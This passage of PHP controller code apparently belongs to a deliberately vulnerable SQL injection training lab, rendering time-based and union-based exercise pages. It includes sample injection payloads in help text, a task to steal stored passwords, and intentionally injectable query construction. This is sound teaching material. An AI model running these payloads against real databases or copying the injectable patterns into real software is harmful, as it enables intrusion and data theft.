            $MenuHtml = $this->CreateMenuBlocks($id);
            $InfoHtml = $this->GetCurrentInfo($id, "", "");

            $CurrentLevel = htmlspecialchars(strtolower(trim($_COOKIE["lab_level"])));
            $source_api = highlight_string(@file_get_contents(GRAPHSQLI_LAB_ROOT . "mvc/controllers/lab_api_source/time-based/{$CurrentLevel}.php"), true);
            $help_body = "";
            if ($CurrentLevel === "low") {
                $help_body = "
                    The SQL query uses RAW input that is directly controlled by the attacker. All they need to-do is escape the query and then they are able to execute any 
                    SQL query they wish.<br>
                    <pre>Sample payload: <span style=\"color: black; background: black;\">id: 1' AND IF(SUBSTR(database(),1,1)='g',sleep(3),false)#</span>.</pre>";
            } else if ($CurrentLevel === "medium") {
                $help_body = "The medium level uses a form of SQL injection protection, with the function of " .
                    $this->getExternalHtmlLink('https://www.php.net/manual/en/mysqli.real-escape-string.php', 'mysqli::real_escape_string') . "<br>However due to the 
                    SQL query not having quotes around the parameter, this will not fully
                    protect the query from being altered.<br>
                    The text box has been replaced with a pre-defined dropdown list to submit the form.<br>
                    <pre>Sample payload: <span style=\"color: black; background: black;\">id: 1 AND IF(ASCII(SUBSTR(database(),1,1))=103,sleep(3),false)#<</span>.</pre>";
            } else if ($CurrentLevel === "high") {
                $help_body = "
                    This is very similar to the low level, however this time the attacker is inputting the value
                    in a different manner.
                    The input values are being transferred to the vulnerable query via session variables using
                    another form. <br>
                    <pre>Sample payload: <span style=\"color: black; background: black;\">id: 1' AND IF(SUBSTR(database(),1,1)='g',sleep(3),false)#</span>.</pre>";
            } else if ($CurrentLevel === "impossible") {
                $help_body = "The queries are now parameterized queries (rather than being dynamic). This means the query
                    has been defined by the developer,
                    and has distinguish which sections are code, and the rest is data.";
            }

            $body = "
            <div class=\"row\">
                <div class=\"col-md-12 widget-holder\">
                    <div class=\"widget-bg\">
                        <div class=\"widget-body clearfix\">
                            <h1 class=\"box-title\">Vulnerability: Time based SQL Injection</h1>
                            <div class=\"widget-body clearfix\">
                                Time based SQL Injection is an inferential SQL Injection technique that relies on sending an
                                SQL query to the database which forces the database to wait for a specified amount of time
                                (in seconds) before responding. The response time will indicate to the attacker whether the
                                result of the query is TRUE or FALSE.<br>
                                It is often possible to exploit the vulnerability by triggering time delays conditionally,
                                depending on an injected condition. Because SQL queries are generally processed
                                synchronously by the application, delaying the execution of an SQL query will also delay the
                                HTTP response. This allows us to infer the truth of the injected condition based on the time
                                taken before the HTTP response is received.<br>
                                Using this method, an attacker enumerates each letter of the desired piece of data using the
                                following logic:
                                <ul>
                                    <li>If the first letter of the first database’s name is an ‘A’, wait for 10 seconds.</li>
                                    <li>If the second letter of the first database’s name is an ‘B’, wait for 10 seconds. etc.</li>
                                </ul>
                                Example: <pre>https://example.com/index.php?id=1+AND+IF(SUBSTR(database(),1,1)='g'',sleep(3),false)#</pre>
                                If the page takes longer than usual to load it is safe to assume that value of the first letter in database version is g
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class=\"row\">
                <div class=\"col-md-12 widget-holder\">
                    <div class=\"widget-bg\">
                        <div class=\"widget-body clearfix\">
                            <h1 class=\"box-title\">Lab Section</h1>
                            <div class=\"widget-body clearfix\">Objective: Find the name of the SQL database through a Time based SQL Injection attack.<br><br> 
            ";

            if ($CurrentLevel === "high") {
                $body .= "
                    <button class=\"btn btn-info ripple\" data-toggle=\"modal\" data-target=\"#changeID-modal\">Click here to change UserID</button>
                    <div id=\"changeID-modal\" class=\"modal fade\" tabindex=\"-1\" role=\"dialog\" aria-hidden=\"true\" style=\"display: none\">
                         <div class=\"modal-dialog\">
                            <div class=\"modal-content\">
                                <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-hidden=\"true\">×</button>
                                <div class=\"modal-body\">
                                    <form id=\"changeIdForm\" method=\"POST\">
                                        <div class=\"form-group\">
                                            <label for=\"userid\">UserID</label>
                                            <input class=\"form-control\" type=\"text\" id=\"userId\" required=\"\">
                                        </div>
                                        <div class=\"text-center mr-b-30\">
                                            <button class=\"btn btn-rounded btn-lg btn-success ripple\" id=\"changeIdBtn\" type=\"submit\" value=\"change_id\"'>Change ID</button>
                                        </div>
                                    </form>
                                </div>
                            </div>
                         </div>           
                    </div>
                    <p class=\"text-success\" id=\"output\"></p>
                    <script type=\"text/javascript\">
                    $(document).ready(function() {
                        $('#changeIdForm').submit(function(e) {
                            e.preventDefault();
                            var formDataId = {
                                'id' : document.getElementById('userId').value,
                                'action':  document.getElementById('changeIdBtn').value
                            };
                            $.ajax({
                                type: \"POST\",
                                url: '/api/change_id',
                                datatype: 'json',
                                data: JSON.stringify(formDataId),
                                success: function(result)
                                {
                                    if(typeof result.error == \"undefined\"){
                                        $('#changeID-modal').modal('hide');
                                        var formData = {'query' : 'query { user { UserId, FirstName, LastName}}'};
                                        $.ajax({
                                            type: \"POST\",
                                            url: '/lab_api/TimeBased',
                                            datatype: 'json',
                                            data: JSON.stringify(formData),
                                            success: function(result)
                                            {
                                                document.getElementById(\"output\").innerHTML = result.result;
                                            }
                                        });
                                    } else{
                                        document.getElementById(\"output\").innerHTML = result.error.message;
                                    }
                                }
                           });
                        });
                    });
                    </script>";
            } else {
                $body .= "
                        <form id=\"searchForm\" method=\"POST\">
                            <div class=\"form-group row\">
                                <label class=\"col-md-1 col-form-label\">User ID:</label>
                                ";
                if ($CurrentLevel === "medium") {
                    $numRow = $this->User->GetAmountUser();
                    $body .= "    <div class=\"col-md-3\"><div class=\"input-group\"><select class=\"form-control\" id=\"searchId\" name=\"id\">";

                    for ($i = 1; $i < $numRow[0] + 1; $i++) {
                        $body .= "<option value=\"{$i}\">{$i}</option>";
                    }
                    $body .= "</select></div></div>";
                } else {
                    $body .= "    <div class=\"col-md-3\"><input id=\"searchId\" class=\"form-control\" name=\"id\"></div>";
                }
                $body .= "\n				<div class=\"col-md-3\"><div class=\"input-group\"><button class=\"btn btn-primary btn-rounded\" type=\"submit\" value=\"Submit\" name=\"Submit\">Submit</button></div></div></div>\n";
                $body .= "
		                    </form>";
                $body .= "
                    <p class=\"text-success\" id=\"output\"></p>
                    <script type=\"text/javascript\">
                    $(document).ready(function() {
                        $('#searchForm').submit(function(e) {
                            e.preventDefault();
                            var formData = {
                                'query' : 'query { user (id:\"' + document.getElementById('searchId').value + '\"){ UserId, FirstName, LastName}}'
                            };
                            $.ajax({
                                type: \"POST\",
                                url: '/lab_api/TimeBased',
                                datatype: 'json',
                                data: JSON.stringify(formData),
                                success: function(result)
                                {
                                      document.getElementById(\"output\").innerHTML = result.result;
                               }
                           });
                         });
                    });
                    </script>
                    ";
            }
            $body .= "            <div class=\"row\">
                                    <div class=\"col-md-3 ml-md-auto btn-list\">
                                        <div class=\"btn-group m-r-10\">
                                            <button aria-expanded=\"false\" data-toggle=\"dropdown\" class=\"btn btn-info dropdown-toggle ripple\" type=\"button\">View Source <span class=\"caret\"></span></button>
                                            <div role=\"menu\" class=\"dropdown-menu\">
                                                <a class=\"dropdown-item\" data-toggle=\"modal\" data-target=\"#viewSourceModal\" >This level</a>  
                                                <a class=\"dropdown-item\" href=\"/view_source_all/TimeBased\">All level</a>
                                            </div>
                                        </div>
                                        <button data-toggle=\"modal\" data-target=\"#viewHelpModal\" class=\"btn btn-success ripple\" id='\"viewHelpBtn\"'>View Help</button>
                                        <div id=\"viewSourceModal\" class=\"modal modal-info fade\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"modalSource\" aria-hidden=\"true\" style=\"display: none\">
                                            <div class=\"modal-dialog modal-lg\">
                                                <div class=\"modal-content\" id=\"tab1\">
                                                    <div class=\"modal-header\">
                                                        <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-hidden=\"true\">×</button>
                                                        <h5 class=\"modal-title\" id=\"modalSource\">Source code of {$CurrentLevel} level</h5>
                                                    </div>
                                                    <div class=\"modal-body\" id=\"sourceCode\">{$source_api}</div>
                                                </div> 
                                            </div>
                                        </div>
                                        <div id=\"viewHelpModal\" class=\"modal modal-green fade\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"modalHelp\" aria-hidden=\"true\" style=\"display: none\">
                                            <div class=\"modal-dialog modal-lg\">
                                                <div class=\"modal-content\" id=\"tab1\">
                                                    <div class=\"modal-header\">
                                                        <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-hidden=\"true\">×</button>
                                                        <h5 class=\"modal-title\" id=\"modalHelp\">Help for {$CurrentLevel} level</h5>
                                                    </div>
                                                    <div class=\"modal-body\" id=\"helpContent\">{$help_body}</div>
                                                </div> 
                                            </div>
                                        </div>
                                    </div>
                                 </div>
                            </div>
                        </div>
                    </div>
                </div>
             </div>
            <div class=\"row\">
                <div class=\"col-md-12 widget-holder\">
                    <div class=\"widget-bg\">
                        <div class=\"widget-body clearfix\">
                            <h1 class=\"box-title\">More Information</h1>
                            <ul>
                                <li>" . $this->GetExternalHtmlLink('https://www.netsparker.com/blog/web-security/sql-injection-vulnerability/#TimeBasedSQL') . "</li>
                                <li>" . $this->GetExternalHtmlLink('https://portswigger.net/web-security/sql-injection/cheat-sheet') . "</li>
                                <li>" . $this->GetExternalHtmlLink('https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/') . "</li>
                                <li>" . $this->GetExternalHtmlLink('https://www.sqlinjection.net/time-based/') . "</li>
                                <li>" . $this->GetExternalHtmlLink('https://owasp.org/www-community/attacks/SQL_Injection') . "</li>
                            </ul>
                        </div>
                        <!-- /.widget-body -->
                    </div>
                    <!-- /.widget-bg -->
                </div>
            </div>  
            ";

            $this->view("page-template", [
                "menu" => $MenuHtml,
                "info" => $InfoHtml,
                "title" => $title,
                "page_body" => $body
            ]);
        } else {
            http_response_code(403);
            header('Location: /page-error-403.html');
            exit();
        }
    }

    function UnionBased()
    {
        if (isset($_SESSION["username"])) {
            $title = "Union Based SQLi :: GraphSQLi Lab v" . $this->GetVersion();
            $id = "Union Based SQLi";
            $MenuHtml = $this->CreateMenuBlocks($id);
            $InfoHtml = $this->GetCurrentInfo($id, "", "");

            $CurrentLevel = htmlspecialchars(strtolower(trim($_COOKIE["lab_level"])));
            $source_api = highlight_string(@file_get_contents(GRAPHSQLI_LAB_ROOT . "mvc/controllers/lab_api_source/union-based/{$CurrentLevel}.php"), true);
            $help_body = "";
            if ($CurrentLevel === "low") {
                $help_body = "
                    The SQL query uses RAW input that is directly controlled by the attacker. All they need to-do is escape the query and then they are able to execute any 
                    SQL query they wish.<br>
                    <pre>Sample payload: <span style=\"color: black; background: black;\">id: 1' UNION SELECT version(),version(),database()#</span>.</pre>";
            } else if ($CurrentLevel === "medium") {
                $help_body = "The medium level uses a form of SQL injection protection, with the function of " .
                    $this->getExternalHtmlLink('https://www.php.net/manual/en/mysqli.real-escape-string.php', 'mysqli::real_escape_string') . "<br>However due to the 
                    SQL query not having quotes around the parameter, this will not fully
                    protect the query from being altered.<br>
                    The text box has been replaced with a pre-defined dropdown list to submit the form.<br>
                    <pre>Sample payload: <span style=\"color: black; background: black;\">id: 1 UNION SELECT version(),version(),database()#</span>.</pre>";
            } else if ($CurrentLevel === "high") {
                $help_body = "
                    This is very similar to the low level, however this time the attacker is inputting the value
                    in a different manner.
                    The input values are being transferred to the vulnerable query via session variables using
                    another form. <br>
                    <pre>Sample payload: <span style=\"color: black; background: black;\">id: 1' UNION SELECT version(),version(),database()#</span>.</pre>";
            } else if ($CurrentLevel === "impossible") {
                $help_body = "The queries are now parameterized queries (rather than being dynamic). This means the query
                    has been defined by the developer,
                    and has distinguish which sections are code, and the rest is data.";
            }

            $body = "
            <div class=\"row\">
                <div class=\"col-md-12 widget-holder\">
                    <div class=\"widget-bg\">
                        <div class=\"widget-body clearfix\">
                            <h1 class=\"box-title\">Vulnerability: Union based SQL Injection</h1>
                            <div class=\"widget-body clearfix\">
                                Union based SQL Injection is an in-band SQL injection technique that leverages the UNION SQL operator to combine the results of two or more SELECT 
                                statements into a single result which is then returned as part of the HTTP response. <br>
                                When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the UNION 
                                keyword can be used to retrieve data from other tables within the database. This results in an SQL injection UNION attack. <br>
                                The UNION keyword lets you execute one or more additional SELECT queries and append the results to the original query. For example: 
                                <pre>SELECT a, b FROM table1 UNION SELECT c, d FROM table2</pre>
                                This SQL query will return a single result set with two columns, containing values from columns a and b in table1 and columns c and d in table2. <br>
                                For a UNION query to work, two key requirements must be met:
                                <ul>
                                    <li> The individual queries must return the same number of columns. </li>
                                    <li> The data types in each column must be compatible between the individual queries.</li>
                                </ul>
                                To carry out an SQL injection UNION attack, you need to ensure that your attack meets these two requirements. This generally involves figuring out:
                                <ul>
                                    <li>How many columns are being returned from the original query? </li>
                                    <li>Which columns returned from the original query are of a suitable data type to hold the
                                        results from the injected query?</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class=\"row\">
                <div class=\"col-md-12 widget-holder\">
                    <div class=\"widget-bg\">
                        <div class=\"widget-body clearfix\">
                            <h1 class=\"box-title\">Lab Section</h1>
                            <div class=\"widget-body clearfix\">Objective: There are 5 users in the database, with id's from 1 to 5. Your mission is steal their
                            passwords via a Union based SQLi attack.<br><br> 
            ";

            if ($CurrentLevel === "high") {
                $body .= "
                    <button class=\"btn btn-info ripple\" data-toggle=\"modal\" data-target=\"#changeID-modal\">Click here to change UserID</button>
                    <div id=\"changeID-modal\" class=\"modal fade\" tabindex=\"-1\" role=\"dialog\" aria-hidden=\"true\" style=\"display: none\">
                         <div class=\"modal-dialog\">
                            <div class=\"modal-content\">
                                <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-hidden=\"true\">×</button>
                                <div class=\"modal-body\">
                                    <form id=\"changeIdForm\" method=\"POST\">
                                        <div class=\"form-group\">
                                            <label for=\"userid\">UserID</label>
                                            <input class=\"form-control\" type=\"text\" id=\"userId\" required=\"\">
                                        </div>
                                        <div class=\"text-center mr-b-30\">
                                            <button class=\"btn btn-rounded btn-lg btn-success ripple\" id=\"changeIdBtn\" type=\"submit\" value=\"change_id\"'>Change ID</button>
                                        </div>
                                    </form>
                                </div>
                            </div>
                         </div>           
                    </div>
                    <p class=\"text-success\" id=\"output\"></p>
                    <script type=\"text/javascript\">
                    $(document).ready(function() {
                        $('#changeIdForm').submit(function(e) {
                            e.preventDefault();
                            var formDataId = {
                                'id' : document.getElementById('userId').value,
                                'action':  document.getElementById('changeIdBtn').value
                            };
                            $.ajax({
                                type: \"POST\",
                                url: '/api/change_id',
                                datatype: 'json',
                                data: JSON.stringify(formDataId),
                                success: function(result)
                                {
                                    if(typeof result.error == \"undefined\"){
                                        $('#changeID-modal').modal('hide');
                                        var formData = {'query' : 'query { user { UserId, FirstName, LastName}}'};
                                        $.ajax({
                                            type: \"POST\",
                                            url: '/lab_api/UnionBased',
                                            datatype: 'json',
                                            data: JSON.stringify(formData),
                                            success: function(result)
                                            {
                                                var htmlOutput='';
                                                for(let i=0;i<result.data.user.length;i++){
                                                    htmlOutput=htmlOutput+'<br />ID: '+ result.data.user[i]['UserId'] +'<br />First name: '+result.data.user[i]['FirstName']+'<br />Last Name: '+result.data.user[i]['LastName']+'<br />';            
                                                }
                                                document.getElementById(\"output\").innerHTML = htmlOutput;
                                            }
                                        });
                                    } else{
                                        document.getElementById(\"output\").innerHTML = result.error.message;
                                    }
                                }
                           });
                        });
                    });
                    </script>";
            } else {
                $body .= "
                        <form id=\"searchForm\" method=\"POST\">
                            <div class=\"form-group row\">
                                <label class=\"col-md-1 col-form-label\">User ID:</label>
                                ";
                if ($CurrentLevel === "medium") {
                    $numRow = $this->User->GetAmountUser();
                    $body .= "    <div class=\"col-md-3\"><div class=\"input-group\"><select class=\"form-control\" id=\"searchId\" name=\"id\">";

                    for ($i = 1; $i < $numRow[0] + 1; $i++) {
                        $body .= "<option value=\"{$i}\">{$i}</option>";
                    }
                    $body .= "</select></div></div>";
                } else {
                    $body .= "    <div class=\"col-md-3\"><input id=\"searchId\" class=\"form-control\" name=\"id\"></div>";
                }
                $body .= "\n				<div class=\"col-md-3\"><div class=\"input-group\"><button class=\"btn btn-primary btn-rounded\" type=\"submit\" value=\"Submit\" name=\"Submit\">Submit</button></div></div></div>\n";
                $body .= "
		                    </form>";
                $body .= "
                    <p class=\"text-success\" id=\"output\"></p>
                    <script type=\"text/javascript\">
                    $(document).ready(function() {
                        $('#searchForm').submit(function(e) {
                            e.preventDefault();
                            var formData = {
                                'query' : 'query { user (id:\"' + document.getElementById('searchId').value + '\"){ UserId, FirstName, LastName}}'
                            };
                            $.ajax({
                                type: \"POST\",
                                url: '/lab_api/UnionBased',
                                datatype: 'json',
                                data: JSON.stringify(formData),
                                success: function(result)
                                {
                                      var htmlOutput='';
                                      for(let i=0;i<result.data.user.length;i++){
                                        htmlOutput=htmlOutput+'<br />ID: '+ result.data.user[i]['UserId'] +'<br />First name: '+result.data.user[i]['FirstName']+'<br />Last Name: '+result.data.user[i]['LastName']+'<br />';            
                                      }
                                      document.getElementById(\"output\").innerHTML = htmlOutput;
                               }
                           });
                         });
                    });
                    </script>
                    ";
            }
            $body .= "            <div class=\"row\">
                                    <div class=\"col-md-3 ml-md-auto btn-list\">
                                        <div class=\"btn-group m-r-10\">
                                            <button aria-expanded=\"false\" data-toggle=\"dropdown\" class=\"btn btn-info dropdown-toggle ripple\" type=\"button\">View Source <span class=\"caret\"></span></button>
                                            <div role=\"menu\" class=\"dropdown-menu\">
                                                <a class=\"dropdown-item\" data-toggle=\"modal\" data-target=\"#viewSourceModal\" >This level</a>  
                                                <a class=\"dropdown-item\" href=\"/view_source_all/UnionBased\">All level</a>
                                            </div>
                                        </div>
                                        <button data-toggle=\"modal\" data-target=\"#viewHelpModal\" class=\"btn btn-success ripple\" id='\"viewHelpBtn\"'>View Help</button>
                                        <div id=\"viewSourceModal\" class=\"modal modal-info fade\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"modalSource\" aria-hidden=\"true\" style=\"display: none\">
                                            <div class=\"modal-dialog modal-lg\">
                                                <div class=\"modal-content\" id=\"tab1\">
                                                    <div class=\"modal-header\">
                                                        <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-hidden=\"true\">×</button>
                                                        <h5 class=\"modal-title\" id=\"modalSource\">Source code of {$CurrentLevel} level</h5>
                                                    </div>
                                                    <div class=\"modal-body\" id=\"sourceCode\">{$source_api}</div>
                                                </div> 
                                            </div>
                                        </div>
                                        <div id=\"viewHelpModal\" class=\"modal modal-green fade\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"modalHelp\" aria-hidden=\"true\" style=\"display: none\">
                                            <div class=\"modal-dialog modal-lg\">
                                                <div class=\"modal-content\" id=\"tab1\">
                                                    <div class=\"modal-header\">
                                                        <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-hidden=\"true\">×</button>
                                                        <h5 class=\"modal-title\" id=\"modalHelp\">Help for {$CurrentLevel} level</h5>
                                                    </div>
                                                    <div class=\"modal-body\" id=\"helpContent\">{$help_body}</div>
                                                </div> 
                                            </div>
                                        </div>
                                    </div>
                                 </div>
                            </div>
                        </div>
                    </div>
                </div>
             </div>
            <div class=\"row\">
                <div class=\"col-md-12 widget-holder\">
                    <div class=\"widget-bg\">
                        <div class=\"widget-body clearfix\">
                            <h1 class=\"box-title\">More Information</h1>
                            <ul>
                                <li>" . $this->GetExternalHtmlLink('https://portswigger.net/web-security/sql-injection/union-attacks') . "</li>
                                <li>" . $this->GetExternalHtmlLink('https://book.hacktricks.xyz/pentesting-web/sql-injection#exploiting-union-based') . "</li>
                                <li>" . $this->GetExternalHtmlLink('https://portswigger.net/web-security/sql-injection/cheat-sheet') . "</li>
                                <li>" . $this->GetExternalHtmlLink('https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/') . "</li>
                                <li>" . $this->GetExternalHtmlLink('https://www.sqlinjection.net/union/') . "</li>
                                <li>" . $this->GetExternalHtmlLink('https://owasp.org/www-community/attacks/SQL_Injection') . "</li>
                            </ul>
                        </div>
                        <!-- /.widget-body -->
                    </div>
                    <!-- /.widget-bg -->
                </div>
            </div>  
            ";

            $this->view("page-template", [
                "menu" => $MenuHtml,
                "info" => $InfoHtml,
                "title" => $title,
                "page_body" => $body
            ]);
        } else {
            http_response_code(403);
            header('Location: /page-error-403.html');
            exit();
        }
    }
}